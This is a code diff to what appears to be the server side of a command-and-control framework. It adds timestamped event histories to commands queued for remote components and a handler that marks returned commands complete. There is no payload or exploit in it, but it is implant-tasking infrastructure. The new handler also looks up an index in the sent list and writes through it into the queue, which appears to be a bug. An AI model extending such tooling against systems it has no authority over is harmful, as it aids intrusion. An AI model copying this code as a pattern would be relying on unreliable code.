@@ -1,5 +1,6 @@
 import asyncio
 from threading import Thread
+from time import time
 
 from lib import networking
 from lib import instructions
@@ -119,6 +120,8 @@ def lp_getcmd(frame, teamserver):
                     (index for (index, d) in enumerate(teamserver.cmd_queue) if d["txid"] == command["txid"]),
                     None)
                 teamserver.cmd_queue[cmd_index]['state'] = "SENT"
+                event_history = {"timestamp": time(), "event": "SENT", "component": "server"}
+                teamserver.cmd_queue[cmd_index]['history'].append(event_history)
                 teamserver.cmd_sent.append(teamserver.cmd_queue[cmd_index])
                 teamserver.cmd_queue.pop(cmd_index)
         except StopIteration:
@@ -130,9 +133,20 @@ def lp_getcmd(frame, teamserver):
     else:
         data = {'component_id': frame['component_id'], "cmd": "noop",
                 "args": [{"tpk": teamserver.initial_public_key._public_key}], "txid": frame['txid']}
+    if len(frame['done']) > 0:
+        process_done_commands(frame, teamserver)
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = instruction_frame
     return reply_frame
+
+
+def process_done_commands(frame, teamserver):
+    for command in frame['done']:
+        cmd_sent_index = _get_cmd_sent_index(teamserver, command['txid'])
+        command['state'] = "COMPLETE"
+        event_history = {"timestamp": time(), "event": "OUTPUT_RECEIVED", "component": "server"}
+        command['history'].append(event_history)
+        teamserver.cmd_queue[cmd_sent_index] = command
 
 
 def lp_cmdack(frame, teamserver):
